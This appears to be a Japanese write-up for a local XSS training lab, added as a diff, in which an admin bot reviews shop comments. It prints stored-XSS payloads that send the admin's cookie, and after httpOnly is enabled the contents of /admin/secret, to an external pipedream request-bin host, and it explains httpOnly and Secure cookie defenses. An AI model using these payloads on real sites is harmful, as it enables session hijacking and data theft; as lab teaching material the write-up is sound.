@@ -1,0 +1,47 @@
+
+# セットアップ
+
+docker compose upで http://localhost:3000 にページが立ち上がります。
+
+# 問題把握
+ページを見ると、キーボードの販売ページが開きます。
+コメントを送信することができます。
+コメントを送信すると、adminが確認するのでお待ちくださいとなります。
+
+しばらく(最大10秒)すると、コメントが承認されます
+
+# writeup
+
+```
+<font color="red">aaa</font>
+```
+とコメントすると赤文字で表示されるので、XSSが出来ることがわかります。
+
+そこで、閲覧者のCookieを取得しそれを外部へ送信するスクリプトを埋め込みます。
+approveのためにAdminがコメントを閲覧するはずなので、AdminのCookieが抜けるはずです。
+送信先として、requestbin ( https://requestbin.com/ )というサービスを使います。
+
+```
+<script>fetch('http://enx1fi0rxfzxn.x.pipedream.net/?'+document.cookie).then(response => {})</script>
+```
+とコメントすると、requestbinの方にCookieが表示されます。
+
+これを、今のCookieに保存されているsessionと置き換えることで、/admin/secretを閲覧できます。
+
+# writeup2
+
+このようなJSからsession idを抜き出す攻撃の対策として、CookieにはhttpOnly属性や、Secure属性があります。
+初期状態ではこれらが無効であったので、上記の攻撃が成立しましたが、有効にすると成立しなくなります。
+
+main.goの20行目、httpOnlyをtrueにして再度試してみましょう。
+※ Secure属性をtrueにした場合はadmin botが動かなくなるため、シークレットモード等でadminにログインし、手動でapproveしてください。
+そうすると、cookieが読み込めないのがわかると思います。
+
+しかし、javascriptからCookieが読み込めないだけなので、少し工夫は必要ですが抜け道を見つけられます。
+Cookieが必要なページをadmin側で読み込ませ、その結果を送信するようにすればsecretな情報を見ることができます。
+```
+<script>
+fetch('/admin/secret').then(e=>e.text()).then(e=>encodeURI(e))
+.then(response => {fetch('http://enx1fi0rxfzxn.x.pipedream.net/?q='+response)})
+</script>
+```
